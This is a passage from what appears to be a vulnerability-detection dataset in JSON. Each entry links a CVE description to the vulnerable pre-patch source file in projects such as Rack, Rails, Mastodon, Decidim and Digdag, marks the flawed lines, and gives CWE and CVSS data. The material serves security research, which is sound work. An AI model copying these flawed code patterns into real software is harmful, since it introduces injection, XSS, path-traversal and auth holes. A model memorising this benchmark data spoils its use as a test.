$subDirNameLength, $subDirNameLength);\n        }\n\n        return $attachmentPath . (DIRECTORY_SEPARATOR . substr($fsHash, $i * $subDirNameLength));\n    }\n\n    /**\n     * Create subdirectories to save file to.\n     *\n     * @param string $filepath filepath to create subdirectories for\n     * @return bool success\n     */\n    public function createSubDirs(string $filepath): bool\n    {\n        clearstatcache();\n        $attDir = dirname($filepath);\n\n        return file_exists($attDir) && is_dir($attDir) || mkdir($attDir, 0777, true);\n    }\n\n    /**\n     * Check whether the file storage is ok.\n     *\n     * @throws AttachmentException\n     */\n    public function isStorageOk(): bool\n    {\n        clearstatcache();\n        $attachmentDir = dirname($this->buildFilePath());\n\n        return false !== PMF_ATTACHMENTS_DIR &&\n               file_exists(PMF_ATTACHMENTS_DIR) &&\n               is_dir(PMF_ATTACHMENTS_DIR) &&\n               file_exists($attachmentDir) &&\n               is_dir($attachmentDir);\n    }\n\n    /**\n     * Save current attachment to the appropriate storage. The\n     * filepath given will be processed and moved to appropriate\n     * location.\n     *\n     * @param string $filePath full path to the attachment file\n     * @param string $filename filename to force\n     * @throws FileException|AttachmentException\n     * @todo rollback if something went wrong\n     */\n    public function save($filePath, $filename = null): bool\n    {\n        $success = false;\n\n        if (file_exists($filePath)) {\n            $this->realHash = md5_file($filePath);\n            $this->filesize = filesize($filePath);\n            $this->filename = null == $filename ? basename($filePath) : $filename;\n\n            $this->saveMeta();\n\n            $targetFile = $this->buildFilePath();\n\n            if (null !== $this->id && $this->createSubDirs($targetFile)) {\n                // Doing this check we're sure not to unnecessary\n                // overwrite existing unencrypted file duplicates.\n                if (!$this->linkedRecords()) {\n                    $source = new VanillaFile($filePath);\n                    $target = $this->getFile(FilesystemFile::MODE_WRITE);\n\n                    $success = $source->moveTo($target);\n                } else {\n                    $success = true;\n                }\n\n                if ($success) {\n                    $this->postUpdateMeta();\n                } else {\n                    // File wasn't saved\n                    $this->delete();\n                    $success = false;\n                }\n            }\n        }\n\n        return $success;\n    }\n\n    /**\n     * Delete attachment.\n     *\n     * @throws FileException\n     */\n    public function delete(): bool\n    {\n        $success = true;\n\n        // Won't delete the file if there are still some records hanging on it\n        if (!$this->linkedRecords()) {\n            $success &= $this->getFile()->delete();\n        }\n\n        $this->deleteMeta();\n\n        return $success;\n    }\n\n    /**\n     * Retrieve file contents into a variable.\n     */\n    public function get(): string\n    {\n    }\n\n    /**\n     * Output current file to stdout.\n     *\n     * @param bool   $headers if headers must be sent\n     * @param string $disposition disposition type (ignored if $headers false)\n     * @throws AttachmentException\n     */\n    public function rawOut($headers = true, $disposition = 'attachment'): void\n    {\n        $file = $this->getFile();\n\n        if ($headers) {\n            $disposition = 'attachment' == $disposition ? 'attachment' : 'inline';\n            header('Content-Type: ' . $this->mimeType);\n            header('Content-Length: ' . $this->filesize);\n            header(\"Content-Disposition: $disposition; filename=\\\"\" . rawurlencode($this->filename) . \"\\\"\");\n            header(\"Content-MD5: {$this->realHash}\");\n        }\n\n        while (!$file->eof()) {\n            echo $file->getChunk();\n        }\n    }\n\n    /**\n     * Factory method to initialise the corresponding file object.\n     *\n     * @param string $mode File mode for file open\n     * @return VanillaFile|EncryptedFile\n     * @throws AttachmentException\n     */\n    private function getFile($mode = FilesystemFile::MODE_READ)\n    {\n        if ($this->encrypted) {\n            $file = new EncryptedFile(\n                $this->buildFilePath(),\n                $mode,\n                $this->key\n            );\n        } else {\n            $file = new VanillaFile($this->buildFilePath(), $mode);\n        }\n\n        return $file;\n    }\n}\n"
        }
      ],
      "method_level": [
        "public function save($filePath, $filename = null): bool\n    {\n        $success = false;\n\n        if (file_exists($filePath)) {\n            $this->realHash = md5_file($filePath);\n            $this->filesize = filesize($filePath);\n            $this->filename = null == $filename ? basename($filePath) : $filename;\n\n            $this->saveMeta();\n\n            $targetFile = $this->buildFilePath();\n\n            if (null !== $this->id && $this->createSubDirs($targetFile)) {\n                // Doing this check we're sure not to unnecessary\n                // overwrite existing unencrypted file duplicates.\n                if (!$this->linkedRecords()) {\n                    $source = new VanillaFile($filePath);\n                    $target = $this->getFile(FilesystemFile::MODE_WRITE);\n\n                    $success = $source->moveTo($target);\n                } else {\n                    $success = true;\n                }\n\n                if ($success) {\n                    $this->postUpdateMeta();\n                } else {\n                    // File wasn't saved\n                    $this->delete();\n                    $success = false;\n                }\n            }\n        }\n\n        return $success;\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 106,
          "content": "                // Doing this check we're sure not to unnecessary"
        }
      ]
    },
    "cwe": [
      "CWE-434"
    ],
    "severity": "HIGH",
    "cvss_score": 7.2,
    "cvss_version": 3.1
  },
  {
    "id": 390,
    "cve": "CVE-2024-25126",
    "description": "Rack is a modular Ruby web server interface. Carefully crafted content type headers can cause Rack’s media type parser to take much longer than expected, leading to a possible denial of service vulnerability (ReDos 2nd degree polynomial). This vulnerability is patched in 3.0.9.1 and 2.2.8.1.",
    "vulnerability": {
      "file_level": [
        {
          "name": "lib/rack/media_type.rb",
          "content": "# frozen_string_literal: true\n\nmodule Rack\n  # Rack::MediaType parse media type and parameters out of content_type string\n\n  class MediaType\n    SPLIT_PATTERN = %r{\\s*[;,]\\s*}\n\n    class << self\n      # The media type (type/subtype) portion of the CONTENT_TYPE header\n      # without any media type parameters. e.g., when CONTENT_TYPE is\n      # \"text/plain;charset=utf-8\", the media-type is \"text/plain\".\n      #\n      # For more information on the use of media types in HTTP, see:\n      # http://www.w3.org/Protocols/rfc2616/rfc2616-sec3.html#sec3.7\n      def type(content_type)\n        return nil unless content_type\n        content_type.split(SPLIT_PATTERN, 2).first.tap &:downcase!\n      end\n\n      # The media type parameters provided in CONTENT_TYPE as a Hash, or\n      # an empty Hash if no CONTENT_TYPE or media-type parameters were\n      # provided.  e.g., when the CONTENT_TYPE is \"text/plain;charset=utf-8\",\n      # this method responds with the following Hash:\n      #   { 'charset' => 'utf-8' }\n      def params(content_type)\n        return {} if content_type.nil?\n\n        content_type.split(SPLIT_PATTERN)[1..-1].each_with_object({}) do |s, hsh|\n          k, v = s.split('=', 2)\n\n          hsh[k.tap(&:downcase!)] = strip_doublequotes(v)\n        end\n      end\n\n      private\n\n        def strip_doublequotes(str)\n          (str.start_with?('\"') && str.end_with?('\"')) ? str[1..-2] : str\n        end\n    end\n  end\nend\n"
        }
      ],
      "method_level": [
        "def type(content_type)\n        return nil unless content_type\n        content_type.split(SPLIT_PATTERN, 2).first.tap &:downcase!\n      end",
        "def params(content_type)\n        return {} if content_type.nil?\n\n        content_type.split(SPLIT_PATTERN)[1..-1].each_with_object({}) do |s, hsh|\n          k, v = s.split('=', 2)\n\n          hsh[k.tap(&:downcase!)] = strip_doublequotes(v)\n        end\n      end"
      ],
      "hunk_level": [
        {
          "line_no": 18,
          "content": "        content_type.split(SPLIT_PATTERN, 2).first.tap &:downcase!"
        },
        {
          "line_no": 32,
          "content": "          hsh[k.tap(&:downcase!)] = strip_doublequotes(v)"
        }
      ]
    },
    "cwe": [
      "CWE-1333"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.3,
    "cvss_version": 3.1
  },
  {
    "id": 1146,
    "cve": "CVE-2024-45390",
    "description": "@blakeembrey/template is a string template library. Prior to version 1.2.0, it is possible to inject and run code within the template if the attacker has access to write the template name. Version 1.2.0 contains a patch. As a workaround, don't pass untrusted input as the template display name, or don't use the display name feature.",
    "vulnerability": {
      "file_level": [
        {
          "name": "src/index.ts",
          "content": "const INPUT_VAR_NAME = \"it\";\nconst QUOTE_CHAR = '\"';\nconst ESCAPE_CHAR = \"\\\\\";\n\nexport type Template<T extends object> = (data: T) => string;\n\n/**\n * Stringify a template into a function.\n */\nexport function compile(value: string, displayName = \"template\") {\n  let result = QUOTE_CHAR;\n  for (let i = 0; i < value.length; i++) {\n    const char = value[i];\n\n    // Escape special characters due to quoting.\n    if (char === QUOTE_CHAR || char === ESCAPE_CHAR) {\n      result += ESCAPE_CHAR;\n    }\n\n    // Process template param.\n    if (char === \"{\" && value[i + 1] === \"{\") {\n      const start = i + 2;\n      let end = 0;\n      let withinString = \"\";\n\n      for (let j = start; j < value.length; j++) {\n        const char = value[j];\n        if (withinString) {\n          if (char === ESCAPE_CHAR) j++;\n          else if (char === withinString) withinString = \"\";\n          continue;\n        } else if (char === \"}\" && value[j + 1] === \"}\") {\n          i = j + 1;\n          end = j;\n          break;\n        } else if (char === '\"' || char === \"'\" || char === \"`\") {\n          withinString = char;\n        }\n      }\n\n      if (!end) throw new TypeError(`Template parameter not closed at ${i}`);\n\n      const param = value.slice(start, end).trim();\n      const sep = param[0] === \"[\" ? \"\" : \".\";\n      result += `${QUOTE_CHAR} + (${INPUT_VAR_NAME}${sep}${param}) + ${QUOTE_CHAR}`;\n      continue;\n    }\n\n    result += char;\n  }\n  result += QUOTE_CHAR;\n\n  return `function ${displayName}(${INPUT_VAR_NAME}) { return ${result}; }`;\n}\n\n/**\n * Fast and simple string templates.\n */\nexport function template<T extends object = object>(\n  value: string,\n  displayName?: string\n) {\n  const body = compile(value, displayName);\n  return new Function(`return (${body});`)() as Template<T>;\n}\n"
        }
      ],
      "method_level": [
        "compile",
        "template"
      ],
      "hunk_level": [
        {
          "line_no": 10,
          "content": "export function compile(value: string, displayName = \"template\") {"
        },
        {
          "line_no": 53,
          "content": "  return `function ${displayName}(${INPUT_VAR_NAME}) { return ${result}; }`;"
        },
        {
          "line_no": 59,
          "content": "export function template<T extends object = object>("
        },
        {
          "line_no": 60,
          "content": "  value: string,"
        },
        {
          "line_no": 61,
          "content": "  displayName?: string"
        },
        {
          "line_no": 62,
          "content": ") {"
        },
        {
          "line_no": 63,
          "content": "  const body = compile(value, displayName);"
        }
      ]
    },
    "cwe": [
      "CWE-94"
    ],
    "severity": "HIGH",
    "cvss_score": 7.3,
    "cvss_version": 3.1
  },
  {
    "id": 1179,
    "cve": "CVE-2024-32034",
    "description": "decidim is a Free Open-Source participatory democracy, citizen participation and open government for cities and organizations. The admin panel is subject to potential Cross-site scripting (XSS) attach in case an admin assigns a valuator to a proposal, or does any other action that generates an admin activity log where one of the resources has an XSS crafted. This issue has been addressed in release version 0.27.7, 0.28.2, and newer. Users are advised to upgrade. Users unable to upgrade may redirect the pages /admin and /admin/logs to other admin pages to prevent this access (i.e. `/admin/organization/edit`).",
    "vulnerability": {
      "file_level": [
        {
          "name": "decidim-core/app/presenters/decidim/admin_log/organization_presenter.rb",
          "content": "# frozen_string_literal: true\n\nmodule Decidim\n  module AdminLog\n    # This class holds the logic to present a `Decidim::Organization`\n    # for the `AdminLog` log.\n    #\n    # Usage should be automatic and you should not need to call this class\n    # directly, but here is an example:\n    #\n    #    action_log = Decidim::ActionLog.last\n    #    view_helpers # => this comes from the views\n    #    OrganizationPresenter.new(action_log, view_helpers).present\n    class OrganizationPresenter < Decidim::Log::BasePresenter\n      private\n\n      def diff_fields_mapping\n        return { external_domain_whitelist: :string } if action == \"update_external_domain\"\n\n        settings_attributes_mapping\n          .merge(omnipresent_banner_attributes_mapping)\n          .merge(highlighted_content_banner_attributes_mapping)\n          .merge(appearance_attributes_mapping)\n          .merge(id_documents_attributes_mapping)\n      end\n\n      def settings_attributes_mapping\n        {\n          name: :string,\n          default_locale: :locale,\n          reference_prefix: :string,\n          twitter_handler: :string,\n          facebook_handler: :string,\n          instagram_handler: :string,\n          youtube_handler: :string,\n          github_handler: :string,\n          tos_version: :datetime\n        }\n      end\n\n      def omnipresent_banner_attributes_mapping\n        {\n          enable_omnipresent_banner: :boolean,\n          omnipresent_banner_url: :string,\n          omnipresent_banner_short_description: :i18n,\n          omnipresent_banner_title: :i18n\n        }\n      end\n\n      def highlighted_content_banner_attributes_mapping\n        {\n          highlighted_content_banner_enabled: :boolean,\n          highlighted_content_banner_action_url: :string,\n          highlighted_content_banner_image: :string,\n          highlighted_content_banner_title: :i18n,\n          highlighted_content_banner_short_description: :i18n,\n          highlighted_content_banner_action_title: :i18n,\n          highlighted_content_banner_action_subtitle: :i18n\n        }\n      end\n\n      def appearance_attributes_mapping\n        {\n          cta_button_path: :string,\n          cta_button_text: :i18n,\n          description: :i18n,\n          logo: :string,\n          header_snippets: :string,\n          favicon: :string,\n          official_img_footer: :string,\n          official_url: :string\n        }\n      end\n\n      def id_documents_attributes_mapping\n        {\n          id_documents_methods: :string,\n          id_documents_explanation_text: :i18n\n        }\n      end\n\n      def action_string\n        case action\n        when \"update_id_documents_config\", \"update_external_domain\"\n          \"decidim.admin_log.organization.#{action}\"\n        else\n          \"decidim.admin_log.organization.update\"\n        end\n      end\n\n      def i18n_labels_scope\n        \"activemodel.attributes.organization\"\n      end\n\n      def diff_actions\n        super + %w(update_id_documents_config update_external_domain)\n      end\n    end\n  end\nend\n"
        }
      ],
      "method_level": [
        "def settings_attributes_mapping\n        {\n          name: :string,\n          default_locale: :locale,\n          reference_prefix: :string,\n          twitter_handler: :string,\n          facebook_handler: :string,\n          instagram_handler: :string,\n          youtube_handler: :string,\n          github_handler: :string,\n          tos_version: :datetime\n        }\n      end"
      ],
      "hunk_level": [
        {
          "line_no": 29,
          "content": "          name: :string,"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.8,
    "cvss_version": 3.1
  },
  {
    "id": 46,
    "cve": "CVE-2025-27399",
    "description": "Mastodon is a self-hosted, federated microblogging platform. In versions prior to 4.1.23, 4.2.16, and 4.3.4, when the visibility for domain blocks/reasons is set to \"users\" (localized English string: \"To logged-in users\"), users that are not yet approved can view the block reasons. Instance admins that do not want their domain blocks to be public are impacted. Versions 4.1.23, 4.2.16, and 4.3.4 fix the issue.",
    "vulnerability": {
      "file_level": [
        {
          "name": "app/controllers/api/v1/instances/domain_blocks_controller.rb",
          "content": "# frozen_string_literal: true\n\nclass Api::V1::Instances::DomainBlocksController < Api::V1::Instances::BaseController\n  before_action :require_enabled_api!\n  before_action :set_domain_blocks\n\n  vary_by '', if: -> { Setting.show_domain_blocks == 'all' }\n\n  def index\n    if Setting.show_domain_blocks == 'all'\n      cache_even_if_authenticated!\n    else\n      cache_if_unauthenticated!\n    end\n\n    render json: @domain_blocks, each_serializer: REST::DomainBlockSerializer, with_comment: show_rationale_in_response?\n  end\n\n  private\n\n  def require_enabled_api!\n    head 404 unless api_enabled?\n  end\n\n  def api_enabled?\n    show_domain_blocks_for_all? || show_domain_blocks_to_user?\n  end\n\n  def show_domain_blocks_for_all?\n    Setting.show_domain_blocks == 'all'\n  end\n\n  def show_domain_blocks_to_user?\n    Setting.show_domain_blocks == 'users' && user_signed_in?\n  end\n\n  def set_domain_blocks\n    @domain_blocks = DomainBlock.with_user_facing_limitations.by_severity\n  end\n\n  def show_rationale_in_response?\n    always_show_rationale? || show_rationale_for_user?\n  end\n\n  def always_show_rationale?\n    Setting.show_domain_blocks_rationale == 'all'\n  end\n\n  def show_rationale_for_user?\n    Setting.show_domain_blocks_rationale == 'users' && user_signed_in?\n  end\nend\n"
        }
      ],
      "method_level": [
        "def show_domain_blocks_to_user?\n    Setting.show_domain_blocks == 'users' && user_signed_in?\n  end",
        "def show_rationale_for_user?\n    Setting.show_domain_blocks_rationale == 'users' && user_signed_in?\n  end"
      ],
      "hunk_level": [
        {
          "line_no": 34,
          "content": "    Setting.show_domain_blocks == 'users' && user_signed_in?"
        },
        {
          "line_no": 50,
          "content": "    Setting.show_domain_blocks_rationale == 'users' && user_signed_in?"
        }
      ]
    },
    "cwe": [
      "CWE-285",
      "CWE-200"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.3,
    "cvss_version": 3.1
  },
  {
    "id": 533,
    "cve": "CVE-2024-29901",
    "description": "The AuthKit library for Next.js provides helpers for authentication and session management using WorkOS & AuthKit with Next.js.\nA user can reuse an expired session by controlling the `x-workos-session` header. The vulnerability is patched in v0.4.2.",
    "vulnerability": {
      "file_level": [
        {
          "name": "src/session.ts",
          "content": "import { redirect } from 'next/navigation';\nimport { cookies, headers } from 'next/headers';\nimport { NextRequest, NextResponse } from 'next/server';\nimport { jwtVerify, createRemoteJWKSet, decodeJwt } from 'jose';\nimport { sealData, unsealData } from 'iron-session';\nimport { cookieName, cookieOptions } from './cookie.js';\nimport { workos } from './workos.js';\nimport { WORKOS_CLIENT_ID, WORKOS_COOKIE_PASSWORD } from './env-variables.js';\nimport { getAuthorizationUrl } from './get-authorization-url.js';\nimport { AccessToken, NoUserInfo, Session, UserInfo } from './interfaces.js';\n\nconst sessionHeaderName = 'x-workos-session';\nconst middlewareHeaderName = 'x-workos-middleware';\n\nconst JWKS = createRemoteJWKSet(new URL(workos.userManagement.getJwksUrl(WORKOS_CLIENT_ID)));\n\nasync function encryptSession(session: Session) {\n  return sealData(session, { password: WORKOS_COOKIE_PASSWORD });\n}\n\nasync function updateSession(request: NextRequest, debug: boolean) {\n  const session = await getSessionFromCookie();\n  const newRequestHeaders = new Headers(request.headers);\n\n  // We store the current request url in a custom header, so we can always have access to it\n  // This is because on hard navigations we don't have access to `next-url` but need to get the current\n  // `pathname` to be able to return the users where they came from before sign-in\n  newRequestHeaders.set('x-url', request.url);\n\n  // Record that the request was routed through the middleware so we can check later for DX purposes\n  newRequestHeaders.set(middlewareHeaderName, 'true');\n\n  // If no session, just continue\n  if (!session) {\n    return NextResponse.next({\n      request: { headers: newRequestHeaders },\n    });\n  }\n\n  const hasValidSession = await verifyAccessToken(session.accessToken);\n\n  if (hasValidSession) {\n    if (debug) console.log('Session is valid');\n    // set the x-workos-session header according to the current cookie value\n    newRequestHeaders.set(sessionHeaderName, cookies().get(cookieName)!.value);\n    return NextResponse.next({\n      request: { headers: newRequestHeaders },\n    });\n  }\n\n  try {\n    if (debug) console.log('Session invalid. Attempting refresh', session.refreshToken);\n\n    // If the session is invalid (i.e. the access token has expired) attempt to re-authenticate with the refresh token\n    const { accessToken, refreshToken } = await workos.userManagement.authenticateWithRefreshToken({\n      clientId: WORKOS_CLIENT_ID,\n      refreshToken: session.refreshToken,\n    });\n\n    if (debug) console.log('Refresh successful:', refreshToken);\n\n    // Encrypt session with new access and refresh tokens\n    const encryptedSession = await encryptSession({\n      accessToken,\n      refreshToken,\n      user: session.user,\n      impersonator: session.impersonator,\n    });\n\n    newRequestHeaders.set(sessionHeaderName, encryptedSession);\n\n    const response = NextResponse.next({\n      request: { headers: newRequestHeaders },\n    });\n    // update the cookie\n    response.cookies.set(cookieName, encryptedSession, cookieOptions);\n    return response;\n  } catch (e) {\n    console.warn('Failed to refresh', e);\n    const response = NextResponse.next();\n    response.cookies.delete(cookieName);\n    return response;\n  }\n}\n\nasync function getUser(options?: { ensureSignedIn: false }): Promise<UserInfo | NoUserInfo>;\n\nasync function getUser(options: { ensureSignedIn: true }): Promise<UserInfo>;\n\nasync function getUser({ ensureSignedIn = false } = {}) {\n  const hasMiddleware = Boolean(headers().get(middlewareHeaderName));\n\n  if (!hasMiddleware) {\n    throw new Error(\n      'You are calling `getUser` on a path that isn’t covered by the AuthKit middleware. Make sure it is running on all paths you are calling `getUser` from by updating your middleware config in `middleware.(js|ts)`.',\n    );\n  }\n\n  const session = await getSessionFromHeader();\n  if (!session) {\n    if (ensureSignedIn) {\n      const url = headers().get('x-url');\n      const returnPathname = url ? new URL(url).pathname : undefined;\n      redirect(await getAuthorizationUrl(returnPathname));\n    }\n    return { user: null };\n  }\n\n  const { sid: sessionId, org_id: organizationId, role } = decodeJwt<AccessToken>(session.accessToken);\n\n  return {\n    sessionId,\n    user: session.user,\n    organizationId,\n    role,\n    impersonator: session.impersonator,\n  };\n}\n\nasync function terminateSession() {\n  const { sessionId } = await getUser();\n  if (sessionId) {\n    redirect(workos.userManagement.getLogoutUrl({ sessionId }));\n  }\n  redirect('/');\n}\n\nasync function verifyAccessToken(accessToken: string) {\n  try {\n    await jwtVerify(accessToken, JWKS);\n    return true;\n  } catch (e) {\n    console.warn('Failed to verify session:', e);\n    return false;\n  }\n}\n\nasync function getSessionFromCookie() {\n  const cookie = cookies().get(cookieName);\n  if (cookie) {\n    return unsealData<Session>(cookie.value, {\n      password: WORKOS_COOKIE_PASSWORD,\n    });\n  }\n}\n\nasync function getSessionFromHeader(): Promise<Session | undefined> {\n  const authHeader = headers().get(sessionHeaderName);\n  if (!authHeader) return;\n\n  return unsealData<Session>(authHeader, { password: WORKOS_COOKIE_PASSWORD });\n}\n\nexport { encryptSession, updateSession, getUser, terminateSession };\n"
        }
      ],
      "method_level": [
        "updateSession"
      ],
      "hunk_level": [
        {
          "line_no": 80,
          "content": "    const response = NextResponse.next();"
        }
      ]
    },
    "cwe": [
      "CWE-294"
    ],
    "severity": "MEDIUM",
    "cvss_score": 4.8,
    "cvss_version": 3.1
  },
  {
    "id": 378,
    "cve": "CVE-2024-26143",
    "description": "Rails is a web-application framework. There is a possible XSS vulnerability when using the translation helpers in Action Controller. Applications using translation methods like translate, or t on a controller, with a key ending in \"_html\", a :default key which contains untrusted user input, and the resulting string is used in a view, may be susceptible to an XSS vulnerability. The vulnerability is fixed in 7.1.3.1 and 7.0.8.1.",
    "vulnerability": {
      "file_level": [
        {
          "name": "actionpack/lib/abstract_controller/translation.rb",
          "content": "# frozen_string_literal: true\n\nrequire \"active_support/html_safe_translation\"\n\nmodule AbstractController\n  module Translation\n    # Delegates to <tt>I18n.translate</tt>.\n    #\n    # When the given key starts with a period, it will be scoped by the current\n    # controller and action. So if you call <tt>translate(\".foo\")</tt> from\n    # <tt>PeopleController#index</tt>, it will convert the call to\n    # <tt>I18n.translate(\"people.index.foo\")</tt>. This makes it less repetitive\n    # to translate many keys within the same controller / action and gives you a\n    # simple framework for scoping them consistently.\n    def translate(key, **options)\n      if key&.start_with?(\".\")\n        path = controller_path.tr(\"/\", \".\")\n        defaults = [:\"#{path}#{key}\"]\n        defaults << options[:default] if options[:default]\n        options[:default] = defaults.flatten\n        key = \"#{path}.#{action_name}#{key}\"\n      end\n\n      ActiveSupport::HtmlSafeTranslation.translate(key, **options)\n    end\n    alias :t :translate\n\n    # Delegates to <tt>I18n.localize</tt>.\n    def localize(object, **options)\n      I18n.localize(object, **options)\n    end\n    alias :l :localize\n  end\nend\n"
        }
      ],
      "method_level": [
        "def translate(key, **options)\n      if key&.start_with?(\".\")\n        path = controller_path.tr(\"/\", \".\")\n        defaults = [:\"#{path}#{key}\"]\n        defaults << options[:default] if options[:default]\n        options[:default] = defaults.flatten\n        key = \"#{path}.#{action_name}#{key}\"\n      end\n\n      ActiveSupport::HtmlSafeTranslation.translate(key, **options)\n    end"
      ],
      "hunk_level": [
        {
          "line_no": 24,
          "content": "      ActiveSupport::HtmlSafeTranslation.translate(key, **options)"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.1,
    "cvss_version": 3.1
  },
  {
    "id": 288,
    "cve": "CVE-2024-25125",
    "description": "Digdag is an open source tool that to build, run, schedule, and monitor complex pipelines of tasks across various platforms. Treasure Data's digdag workload automation system is susceptible to a path traversal vulnerability if it's configured to store log files locally. This issue may lead to information disclosure and has been addressed in release version 0.10.5.1. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
    "vulnerability": {
      "file_level": [
        {
          "name": "digdag-core/src/main/java/io/digdag/core/log/LocalFileLogServerFactory.java",
          "content": "package io.digdag.core.log;\n\nimport java.util.concurrent.locks.ReentrantReadWriteLock;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.io.IOException;\nimport java.io.FileNotFoundException;\nimport java.time.Instant;\nimport java.nio.file.FileSystems;\nimport java.nio.file.Path;\nimport java.nio.file.Files;\nimport java.nio.file.DirectoryStream;\nimport com.google.inject.Inject;\nimport com.google.common.base.Optional;\nimport com.google.common.io.ByteStreams;\nimport io.digdag.commons.ThrowablesUtil;\nimport io.digdag.core.agent.AgentId;\nimport io.digdag.spi.LogServer;\nimport io.digdag.spi.LogServerFactory;\nimport io.digdag.spi.LogFilePrefix;\nimport io.digdag.spi.DirectUploadHandle;\nimport io.digdag.spi.StorageFileNotFoundException;\nimport io.digdag.client.config.Config;\n\nimport static java.nio.charset.StandardCharsets.UTF_8;\n\npublic class LocalFileLogServerFactory\n    implements LogServerFactory\n{\n    private static final String LOG_GZ_FILE_SUFFIX = \".log.gz\";\n\n    private final Path logPath;\n    private final long logSplitSize;\n    private final AgentId agentId;\n\n    @Inject\n    public LocalFileLogServerFactory(Config systemConfig, AgentId agentId)\n    {\n        this.logPath = FileSystems.getDefault().getPath(systemConfig.get(\"log-server.local.path\", String.class, \"digdag.log\"))\n            .toAbsolutePath()\n            .normalize();\n        this.agentId = agentId;\n        this.logSplitSize = systemConfig.get(\"log-server.local.split_size\", Long.class, 0L);\n    }\n\n    @Override\n    public String getType()\n    {\n        return \"local\";\n    }\n\n    @Override\n    public LogServer getLogServer()\n    {\n        try {\n            return new LocalFileLogServer(logPath);\n        }\n        catch (IOException ex) {\n            throw ThrowablesUtil.propagate(ex);\n        }\n    }\n\n    class LocalFileLogServer\n            extends AbstractFileLogServer\n    {\n        private final Path logPath;\n        private final ReentrantReadWriteLock lock;\n        private final ReentrantReadWriteLock.ReadLock logAppendLock;\n\n        public LocalFileLogServer(Path logPath)\n            throws IOException\n        {\n            this.logPath = logPath;\n            this.lock = new ReentrantReadWriteLock();\n            this.logAppendLock = lock.readLock();\n        }\n\n        @Override\n        public Optional<DirectUploadHandle> getDirectUploadHandle(String dateDir, String attemptDir, String fileName)\n        {\n            return Optional.absent();\n        }\n\n        @Override\n        protected void putFile(String dateDir, String attemptDir, String fileName, byte[] gzData)\n        {\n            Path dir = getPrefixDir(dateDir, attemptDir);\n            try {\n                Files.createDirectories(dir);\n                Path path = dir.resolve(fileName);\n                try (OutputStream out = Files.newOutputStream(path)) {\n                    out.write(gzData);\n                }\n            }\n            catch (IOException ex) {\n                throw ThrowablesUtil.propagate(ex);\n            }\n        }\n\n        @Override\n        protected void listFiles(String dateDir, String attemptDir, boolean enableDirectDownload, FileMetadataConsumer consumer)\n        {\n            Path dir = getPrefixDir(dateDir, attemptDir);\n            if (!Files.exists(dir)) {\n                return;\n            }\n\n            try (DirectoryStream<Path> ds = Files.newDirectoryStream(dir)) {\n                for (Path path : ds) {\n                    consumer.accept(\n                            path.getFileName().toString(),\n                            Files.size(path),\n                            null);\n                }\n            }\n            catch (IOException ex) {\n                throw ThrowablesUtil.propagate(ex);\n            }\n        }\n\n        @Override\n        protected byte[] getFile(String dateDir, String attemptDir, String fileName)\n            throws StorageFileNotFoundException\n        {\n            Path path = getPrefixDir(dateDir, attemptDir).resolve(fileName);\n            try (InputStream in = Files.newInputStream(path)) {\n                return ByteStreams.toByteArray(in);\n            }\n            catch (FileNotFoundException ex) {\n                throw new StorageFileNotFoundException(ex);\n            }\n            catch (IOException ex) {\n                throw ThrowablesUtil.propagate(ex);\n            }\n        }\n\n        private Path getPrefixDir(String dateDir, String attemptDir)\n        {\n            return logPath.resolve(dateDir).resolve(attemptDir);\n        }\n\n        public LocalFileDirectTaskLogger newDirectTaskLogger(LogFilePrefix prefix, String taskName)\n        {\n            try {\n                return new LocalFileDirectTaskLogger(prefix, taskName, logSplitSize);\n            }\n            catch (IOException ex) {\n                throw ThrowablesUtil.propagate(ex);\n            }\n        }\n\n        class LocalFileDirectTaskLogger\n            implements TaskLogger\n        {\n            private CountingLogOutputStream output;\n            private final long splitSize;\n\n            private final Path dir;\n            private final String taskName;\n\n            public LocalFileDirectTaskLogger(LogFilePrefix prefix, String taskName, Long splitSize)\n                throws IOException\n            {\n                String dateDir = LogFiles.formatDataDir(prefix);\n                String attemptDir = LogFiles.formatSessionAttemptDir(prefix);\n                this.dir = getPrefixDir(dateDir, attemptDir);\n                this.taskName = taskName;\n\n                this.splitSize = splitSize;\n\n                this.output = openNewFile();\n            }\n\n            private CountingLogOutputStream openNewFile()\n                    throws IOException\n            {\n                String fileName = LogFiles.formatFileName(taskName, Instant.now(), agentId.toString());\n                Files.createDirectories(dir);\n                Path path = dir.resolve(fileName);\n                return new CountingLogOutputStream(path);\n            }\n\n            @Override\n            public void log(LogLevel level, long timestamp, String message)\n            {\n                byte[] data = message.getBytes(UTF_8);\n                log(data, 0, data.length);\n            }\n\n            @Override\n            public synchronized void log(byte[] data, int off, int len)\n            {\n                try {\n                    if (output == null) {\n                        output = openNewFile();\n                    }\n                    else if (splitSize > 0 && output.getUncompressedSize() > splitSize) {\n                        output.close();\n                        output = null;\n                        output = openNewFile();\n                    }\n                    output.write(data, off, len);\n                }\n                catch (IOException ex) {\n                    // here can do almost nothing. adding logs to logger causes infinite loop\n                    throw ThrowablesUtil.propagate(ex);\n                }\n            }\n\n            @Override\n            public synchronized void close()\n            {\n                try {\n                    output.close();\n                }\n                catch (IOException ex) {\n                    throw ThrowablesUtil.propagate(ex);\n                }\n            }\n        }\n    }\n}\n"
        }
      ],
      "method_level": [
        "@Override\n        protected byte[] getFile(String dateDir, String attemptDir, String fileName)\n            throws StorageFileNotFoundException\n        {\n            Path path = getPrefixDir(dateDir, attemptDir).resolve(fileName);\n            try (InputStream in = Files.newInputStream(path)) {\n                return ByteStreams.toByteArray(in);\n            }\n            catch (FileNotFoundException ex) {\n                throw new StorageFileNotFoundException(ex);\n            }\n            catch (IOException ex) {\n                throw ThrowablesUtil.propagate(ex);\n            }\n        }"
      ],
      "hunk_level": [
        {
          "line_no": 125,
          "content": "            Path path = getPrefixDir(dateDir, attemptDir).resolve(fileName);"
        },
        {
          "line_no": 129,
          "content": "            catch (FileNotFoundException ex) {"
        }
      ]
    },
    "cwe": [
      "CWE-22"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.3,
    "cvss_version": 3.1
  },
  {
    "id": 216,
    "cve": "CVE-2024-24569",
